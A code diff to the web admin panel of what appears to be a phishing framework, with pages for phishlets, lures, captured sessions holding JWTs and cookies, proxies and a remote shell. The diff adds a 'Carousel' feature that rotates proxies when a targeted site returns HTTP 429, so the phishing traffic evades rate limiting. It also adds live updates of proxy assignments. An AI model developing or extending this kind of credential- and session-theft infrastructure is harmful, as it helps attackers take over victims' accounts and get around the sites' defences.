@@ -106,7 +106,7 @@ tr:hover td{background:var(--accent-dim)}
 @media(max-width:768px){.jwt-grid{grid-template-columns:1fr}}
 .sessFilter:hover{border-color:var(--accent);color:var(--accent)}
 .sessFilter.active{background:var(--accent);color:var(--bg);border-color:var(--accent);font-weight:700}
-.btn{padding:10px 20px;border:1px solid var(--border);color:var(--text);background:transparent;font-family:var(--font);font-size:13px;font-weight:600;cursor:pointer;border-radius:8px;transition:all 0.25s;letter-spacing:0.5px}
+.btn{padding:10px 20px;border:1px solid var(--border);color:var(--text);background:transparent;font-family:var(--font);font-size:13px;font-weight:600;cursor:pointer;border-radius:8px;transition:all 0.25s;letter-spacing:0.5px;display:inline-flex;align-items:center;justify-content:center;gap:8px}
 .btn:hover{border-color:var(--border-h);transform:translateY(-1px)}
 .btn.sm{padding:7px 12px;font-size:12px;border-radius:6px}
 .btn.sm i{transition:transform 0.25s}
@@ -394,6 +394,10 @@ tr:hover td{background:var(--accent-dim)}
 .px-assign-row .field{margin:0;flex:1;min-width:0}
 .px-assign-row .field select{height:46px;padding:0 12px}
 .px-assign-row .btn{height:46px;white-space:nowrap;flex:0 0 auto;display:inline-flex;align-items:center;justify-content:center}
+.btn.px-carousel-btn{border-color:rgba(34,211,238,0.3);color:var(--cyan)}
+.btn.px-carousel-btn:hover{background:rgba(34,211,238,0.1);border-color:var(--cyan)}
+.btn.px-carousel-btn.on{background:rgba(34,211,238,0.16);border-color:var(--cyan);color:var(--cyan);box-shadow:0 0 14px rgba(34,211,238,0.22)}
+.px-car-badge{display:inline-block;margin-left:8px;padding:2px 7px;border-radius:999px;font-size:10px;letter-spacing:0.6px;text-transform:uppercase;color:var(--cyan);border:1px solid rgba(34,211,238,0.35);background:rgba(34,211,238,0.1);font-weight:700;vertical-align:middle}
 .px-assign-checks{display:flex;flex-direction:column;gap:8px;margin:12px 0;max-height:140px;overflow-y:auto}
 .px-assign-check{display:flex;align-items:center;gap:6px;cursor:pointer;font-size:13px;color:var(--text2)}
 .px-assign-check input{accent-color:var(--accent)}
@@ -743,6 +747,7 @@ tr:hover td{background:var(--accent-dim)}
         <div class="px-assign-row">
           <div class="field" style="margin:0;min-width:160px;flex:1"><label>PHISHLET</label><select id="pxAssignPh"></select></div>
           <button class="btn fill" id="pxAssignBtn" onclick="pxAssign()"><i class="fa-solid fa-check"></i> Assign</button>
+          <button type="button" class="btn px-carousel-btn" id="pxCarouselBtn" onclick="pxCarouselToggle()" title="On 429: switch to the next proxy without detaching — current hop goes to the end of the queue" aria-pressed="false"><i class="fa-solid fa-repeat"></i> Carousel</button>
           <button class="btn danger" id="pxDetachBtn" onclick="pxDetach()"><i class="fa-solid fa-link-slash"></i> Detach</button>
         </div>
         <div class="px-assign-checks" id="pxAssignChecks"></div>
@@ -850,7 +855,7 @@ function labelTable(tbody){
   });
 }
 function bindCardTables(){document.querySelectorAll('.tbl-wrap tbody').forEach(labelTable)}
-$$('.sidebar nav a[data-page]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const pg=a.dataset.page;$$('.sidebar nav a').forEach(x=>x.classList.remove('active'));a.classList.add('active');$$('.page').forEach(p=>p.classList.remove('active'));$(`#page-${pg}`).classList.add('active');$('#pageTitle').textContent=pageNames[pg]||pg.toUpperCase();closeSidebar();stopHealth();if(pg==='dashboard')loadDashboard();if(pg==='phishlets')loadPhishlets();if(pg==='config')loadConfig();if(pg==='lures')loadLures();if(pg==='proxy')loadProxy();if(pg==='files')loadFiles();if(pg==='services')loadServices();if(pg==='sessions'){resetSessSearch();loadSessions();}if(pg==='notifications')loadNotifications();if(pg==='terminal')initTerminal();if(pg==='shell')initShell();if(pg==='health')startHealth()})});
+$$('.sidebar nav a[data-page]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const pg=a.dataset.page;$$('.sidebar nav a').forEach(x=>x.classList.remove('active'));a.classList.add('active');$$('.page').forEach(p=>p.classList.remove('active'));$(`#page-${pg}`).classList.add('active');$('#pageTitle').textContent=pageNames[pg]||pg.toUpperCase();closeSidebar();stopHealth();if(pg!=='proxy')stopProxyIdleRefresh();if(pg==='dashboard')loadDashboard();if(pg==='phishlets')loadPhishlets();if(pg==='config')loadConfig();if(pg==='lures')loadLures();if(pg==='proxy')loadProxy();if(pg==='files')loadFiles();if(pg==='services')loadServices();if(pg==='sessions'){resetSessSearch();loadSessions();}if(pg==='notifications')loadNotifications();if(pg==='terminal')initTerminal();if(pg==='shell')initShell();if(pg==='health')startHealth()})});
 let chartTL=null,chartBD=null,_pxChartBar=null,_pxChartDonut=null;
 function renderCharts(d){
   const tl=d.chart_timeline||{labels:[],total:[],jwt:[],cookies:[],empty:[]};
@@ -1774,7 +1779,7 @@ function _renderProxyGrid(st){
     const fresh=!_pxSeen.has(p.id);
     _pxSeen.add(p.id);
     const reg=pxRegionMeta(p.region);
-    h+='<div class="px-tile'+(fresh?' px-in':'')+'" style="animation-delay:'+(fresh?Math.min(idx,6)*0.06:0)+'s">';
+    h+='<div class="px-tile'+(fresh?' px-in':'')+'" data-px-id="'+p.id+'" style="animation-delay:'+(fresh?Math.min(idx,6)*0.06:0)+'s">';
     h+='<div class="px-tile-head"><span class="px-tile-label">'+esc(p.label||'proxy-'+p.id)+'</span><span class="px-badge '+esc(badge)+'">'+esc(badge)+'</span></div>';
     h+='<div class="px-tile-row"><span>IP</span><span class="v">'+esc(p.ipv4||'pending')+'</span></div>';
     h+='<div class="px-tile-row"><span>Region</span><span class="v" style="display:flex;align-items:center;gap:6px">'+pxFlag(reg.country||'')+esc(reg.city||p.region||'—')+'</span></div>';
@@ -1784,8 +1789,8 @@ function _renderProxyGrid(st){
     h+='<div class="px-tile-row"><span>Traffic In</span><span class="v">'+_fmtBits(p.net_in)+'</span></div>';
     h+='<div class="px-tile-row"><span>Traffic Out</span><span class="v">'+_fmtBits(p.net_out)+'</span></div>';
     if(p.metrics_error)h+='<div class="px-tile-row"><span>Metrics</span><span class="v" style="color:var(--orange)">'+esc(p.metrics_error)+'</span></div>';
-    h+=_pxPhishletsHtml(p);
-    h+=_pxTrafficOutHtml(p);
+    h+='<div class="px-live-ph">'+_pxPhishletsHtml(p)+'</div>';
+    h+='<div class="px-live-tr">'+_pxTrafficOutHtml(p)+'</div>';
     const job=_pxPowerJobs[p.id];
     const ls=(p.linode_status||'').toLowerCase();
     const busy=_pxPowerBusy(p);
@@ -1825,6 +1830,7 @@ function _renderAssign(st){
   const proxies=(st.proxies||[]).filter(p=>p.ready||p.status==='active');
   const assign=st.assignments||{};
   const current=st.current||{};
+  const carousel=st.carousel||{};
   let ph=$('#pxAssignPh');
   const prev=ph.value;
   let opts='<option value="">— select phishlet —</option>';
@@ -1849,18 +1855,101 @@ function _renderAssign(st){
       const ip=(p?p.ipv4:i)||i;
       return '<span class="px-ip-chip'+(i===cur?' on':'')+'">'+esc(String(ip))+(i===cur?' ●':'')+'<button title="Detach" onclick="pxDetachOne(\''+esc(k)+'\','+i+')">&times;</button></span>';
     }).join('');
-    ca+='<div class="row"><b>'+esc(k)+'</b><span>'+chips+'</span></div>';
+    ca+='<div class="row"><b>'+esc(k)+(carousel[k]?' <span class="px-car-badge">carousel</span>':'')+'</b><span>'+chips+'</span></div>';
   });
   $('#pxCurAssign').innerHTML=ca;
+  const cb=$('#pxCarouselBtn');
+  if(cb){
+    const on=!!(selPh&&carousel[selPh]);
+    cb.classList.toggle('on',on);
+    cb.setAttribute('aria-pressed',on?'true':'false');
+  }
+}
+function _pxPatchAssignLive(st){
+  const assign=st.assignments||{};
+  const current=st.current||{};
+  const carousel=st.carousel||{};
+  let ca='<h4>Current Assignments</h4>';
+  const keys=Object.keys(assign).filter(k=>(assign[k]||[]).length>0);
+  if(!keys.length)ca+='<div style="color:var(--text3);font-size:13px">No assignments yet</div>';
+  keys.forEach(k=>{
+    const ids=assign[k];
+    const cur=current[k];
+    const chips=ids.map(i=>{
+      const p=(st.proxies||[]).find(x=>x.id===i||String(x.id)===String(i));
+      const ip=(p?p.ipv4:i)||i;
+      return '<span class="px-ip-chip'+(String(i)===String(cur)?' on':'')+'">'+esc(String(ip))+(String(i)===String(cur)?' ●':'')+'<button title="Detach" onclick="pxDetachOne(\''+esc(k)+'\','+i+')">&times;</button></span>';
+    }).join('');
+    ca+='<div class="row"><b>'+esc(k)+(carousel[k]?' <span class="px-car-badge">carousel</span>':'')+'</b><span>'+chips+'</span></div>';
+  });
+  const box=$('#pxCurAssign');
+  if(box)box.innerHTML=ca;
+  const ph=$('#pxAssignPh');
+  const selPh=ph?ph.value:'';
+  const cb=$('#pxCarouselBtn');
+  if(cb){
+    const on=!!(selPh&&carousel[selPh]);
+    cb.classList.toggle('on',on);
+    cb.setAttribute('aria-pressed',on?'true':'false');
+  }
+}
+function _pxPatchCardTraffic(st){
+  (st.proxies||[]).forEach(p=>{
+    const tile=document.querySelector('.px-tile[data-px-id="'+p.id+'"]');
+    if(!tile)return;
+    const ph=tile.querySelector('.px-live-ph');
+    const tr=tile.querySelector('.px-live-tr');
+    if(ph)ph.innerHTML=_pxPhishletsHtml(p);
+    if(tr)tr.innerHTML=_pxTrafficOutHtml(p);
+  });
+}
+function _pxPageOpen(){return $('#page-proxy')&&$('#page-proxy').classList.contains('active')}
+function stopProxyIdleRefresh(){clearInterval(_pxRefreshId);_pxRefreshId=null}
+function _pxApplyLive(msg){
+  if(!_pxPageOpen()||document.hidden||!_pxLastSt)return;
+  const st=_pxLastSt;
+  st.assignments=msg.assignments||st.assignments||{};
+  st.current=msg.current||st.current||{};
+  st.carousel=msg.carousel||st.carousel||{};
+  const used=msg.used_by||{};
+  const liveIds=new Set((msg.proxies||[]).map(p=>String(p.id)));
+  const have=new Set((st.proxies||[]).map(p=>String(p.id)));
+  let idsChanged=liveIds.size!==have.size;
+  liveIds.forEach(id=>{if(!have.has(id))idsChanged=true});
+  (st.proxies||[]).forEach(p=>{
+    const slim=(msg.proxies||[]).find(x=>String(x.id)===String(p.id));
+    if(slim){
+      if(slim.ipv4)p.ipv4=slim.ipv4;
+      if(slim.status)p.status=slim.status;
+      if(slim.label)p.label=slim.label;
+    }
+    const u=used[String(p.id)]||used[p.id];
+    if(u)p.used_by=u;
+  });
+  const rev={};
+  Object.keys(st.assignments||{}).forEach(pl=>{
+    (st.assignments[pl]||[]).forEach(id=>{(rev[String(id)]=rev[String(id)]||[]).push(pl)});
+  });
+  (st.proxies||[]).forEach(p=>{p.assigned_phishlets=[...new Set(rev[String(p.id)]||[])]});
+  _pxPatchAssignLive(st);
+  _renderPxTraffic(st);
+  _pxPatchCardTraffic(st);
+  if(idsChanged)_pxRefreshState(true);
 }
 $('#pxAssignPh')&&$('#pxAssignPh').addEventListener('change',()=>_pxRefreshState());
 function _pxSetBusy(on, which){
-  const a=$('#pxAssignBtn'), d=$('#pxDetachBtn');
+  const a=$('#pxAssignBtn'), d=$('#pxDetachBtn'), c=$('#pxCarouselBtn');
   if(a){
     a.disabled=!!on;
     a.innerHTML=on&&which==='assign'
       ?'<i class="fa-solid fa-spinner fa-spin"></i> Assigning…'
       :'<i class="fa-solid fa-check"></i> Assign';
+  }
+  if(c){
+    c.disabled=!!on;
+    c.innerHTML=on&&which==='carousel'
+      ?'<i class="fa-solid fa-spinner fa-spin"></i> Carousel'
+      :'<i class="fa-solid fa-repeat"></i> Carousel';
   }
   if(d){
     d.disabled=!!on;
@@ -1888,6 +1977,18 @@ async function pxDetach(){
   try{
     const r=await api('/api/proxy/detach',{method:'POST',body:JSON.stringify({phishlet:ph,ids})});
     if(r.error)toast(r.error,'err');else{toast(ph+' detached '+ids.length+' proxy(ies)');await _pxRefreshState()}
+  }finally{_pxSetBusy(false)}
+}
+async function pxCarouselToggle(){
+  const ph=$('#pxAssignPh').value;
+  if(!ph)return toast('Select a phishlet','err');
+  const btn=$('#pxCarouselBtn');
+  const on=!(btn&&btn.classList.contains('on'));
+  _pxSetBusy(true,'carousel');
+  try{
+    const r=await api('/api/proxy/carousel',{method:'POST',body:JSON.stringify({phishlet:ph,enabled:on})});
+    if(r.error)toast(r.error,'err');
+    else{toast(on?'Carousel on — 429 rotates without detach':'Carousel off — 429 will detach');await _pxRefreshState()}
   }finally{_pxSetBusy(false)}
 }
 async function pxDetachOne(ph,id){
@@ -1945,6 +2046,9 @@ socket.on('session_live',function(){
     loadDashboard();
     if($('#page-sessions') && $('#page-sessions').classList.contains('active')) loadSessions();
   },200);
+});
+socket.on('proxy_live',function(msg){
+  try{_pxApplyLive(msg||{})}catch(e){}
 });
 setInterval(loadNcItems,60000);
 loadNcItems();
